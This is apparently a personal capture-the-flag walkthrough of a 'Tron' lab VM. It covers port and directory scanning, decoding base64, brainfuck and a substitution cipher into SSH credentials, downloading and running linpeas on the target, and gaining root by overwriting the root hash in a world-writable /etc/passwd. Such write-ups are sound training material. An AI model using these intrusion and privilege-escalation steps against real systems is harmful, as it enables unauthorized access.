@@ -1,1 +1,281 @@
+			ENUMERATION
+			
 
+---nmap---
+
+                                                                                                                 
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.70 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 15:15 +03
+Nmap scan report for 10.0.2.70
+Host is up (0.00072s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 1f:ed:64:93:84:b5:b2:e8:af:5a:0e:6f:52:af:4b:48 (RSA)
+|   256 3d:df:6f:02:13:9e:15:f8:51:94:30:f8:45:e3:f2:93 (ECDSA)
+|_  256 2f:f4:af:e1:f4:c4:a5:3b:50:bb:e5:b9:2a:9f:39:de (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Master Control Program
+MAC Address: 08:00:27:22:38:15 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.72 ms 10.0.2.70
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.14 seconds
+                                  
+
+
+---ssh and http are open---
+
+
+---I inspect the website and find this comment---
+
+ kzhh:SbWP9q94ZtE9qD  
+
+
+
+---I go to hashes.com and check this string, turns out kzhh is a base64 encoding---
+
+
+
+---not much comes from this, I keep on searching and looking---
+
+
+                                                                                                                 
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.70 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,jpg
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.70
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,jpg,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 304] [--> http://10.0.2.70/img/]
+/manual               (Status: 301) [Size: 307] [--> http://10.0.2.70/manual/]
+/robots.txt           (Status: 200) [Size: 623]
+/font                 (Status: 301) [Size: 305] [--> http://10.0.2.70/font/]
+/MCP                  (Status: 301) [Size: 304] [--> http://10.0.2.70/MCP/]
+/server-status        (Status: 403) [Size: 274]
+Progress: 882240 / 882244 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                    
+
+
+---we discover a page named MCP, checking the contents I see a file named tron.txt and a folder that has a file named
+30513.txt---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# curl http://10.0.2.70/MCP/tron.txt
+MASTER CONTROL PROGRAM
+----------------------
+
+Ram:
+Do you believe in the Users?
+
+Crom:
+Sure I do! If I didn't have a User, than who wrote me? 
+
+
+KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==
+
+
+
+                                                                                                                 
+┌──(root㉿kali)-[/home/okina]
+└─# curl http://10.0.2.70/MCP/terminalserver/30513.txt
+substitute
+--------------------------
+plaintext
+abcdefghijklmnopqrstuvwxyz
+
+ciphertext
+zyxwvutsrqponmlkjihgfedcba
+--------------------------
+
+
+
+---okay, now lets search for the encryption we got from the tron.txt---
+
+
+---I check at hashes.com and discover it's base64 encoding---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/40- TRON LINUX CTF]
+└─# echo "KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==" > MCPencoded.txt | base64 -d
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++.----.-----------.++++++++++++++++++++++++.--------------------.+++++++++++++.  
+
+
+---We found a weird encryption, used ChatGPT and learned that this is a brainfuck encryption, let's decrypt it---
+
+https://www.dcode.fr/brainfuck-language
+
+
+---we got it, it says "player"---
+
+
+
+---now we got the username but we don't have the password. Let's backtrack a little bit, what we saw when we were inspecting the webpage and then what
+we found in the 30513.txt will help us---
+
+
+
+ kzhh:SbWP9q94ZtE9qD  
+
+                                                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# curl http://10.0.2.70/MCP/terminalserver/30513.txt
+substitute
+--------------------------
+plaintext
+abcdefghijklmnopqrstuvwxyz
+
+ciphertext
+zyxwvutsrqponmlkjihgfedcba
+--------------------------
+
+
+---to use this info we go to cyberchef and combine these using the substitute method, like it also says in .txt file---
+
+
+---By doing so we get our password---
+
+
+pass:SyWP9j94ZgE9jD    
+
+
+
+
+---Let's login to ssh using---
+
+player : SyWP9j94ZgE9jD
+
+
+
+
+
+
+			GAINING FOOTHOLD
+
+                                                                                                            
+┌──(root㉿kali)-[/home/okina]
+└─# ssh player@10.0.2.70    
+player@10.0.2.70's password: 
+Linux tron 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+player@tron:~$ ls
+user.txt
+player@tron:~$ cat user.txt 
+---First User Flag---
+
+
+---we are in and got our first flag, let's keep on looking--- 
+			
+			
+---I checked for cronjobs, SUID bits, executable and writable files that we have permission to but not much came up, let's utilize
+linpeas---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+
+player@tron:/tmp$ wget http://10.0.2.54:8080/linpeas.sh
+--2024-05-28 09:36:02--  http://10.0.2.54:8080/linpeas.sh
+
+
+player@tron:/tmp$ bash linpeas.sh 
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/etc/passwd
+/home/player
+.
+.
+.
+.
+
+---/etc/passwd is writable, let's exploit this and become root user then---
+
+
+
+---to do so we can use openssl to create a password hash and write it onto the password hash of the root user and then log in
+as him/her---
+
+
+
+			
+
+			PRIVILEGE ESCALATION
+
+
+
+player@tron:/tmp$ ls -la /etc/passwd
+-rw-r--rw- 1 root root 1399 May 28 09:47 /etc/passwd
+
+
+player@tron:~$ openssl passwd -6 -salt xyz new_password
+$6$xyz$0E0Ak4WKm793vKUCPmWzYG4jDdmdZqUK3USSD27.FIrrkm3uya9G2gcZ88i8jPw9S0JpjlgV66WauyvCnV3pI1
+
+
+---and now replace the "x" with this hashe in the /etc/passwd---
+
+player@tron:/tmp$ cat /etc/passwd
+root:$6$xyz$0E0Ak4WKm793vKUCPmWzYG4jDdmdZqUK3USSD27.FIrrkm3uya9G2gcZ88i8jPw9S0JpjlgV66WauyvCnV3pI1:0:0:root:/root:/bin/bash
+.
+.
+.
+
+
+
+---now the password of root is what you set---
+
+
+player@tron:~$ su root
+Password: 
+root@tron:/home/player#
+
+
+---and boom, now we are root, get the flag and finish this ctf---
+
+
+
+root@tron:/home/player# cd /root
+root@tron:~# ls
+root.txt
+root@tron:~# cat root.txt 
+---Root User Flag---
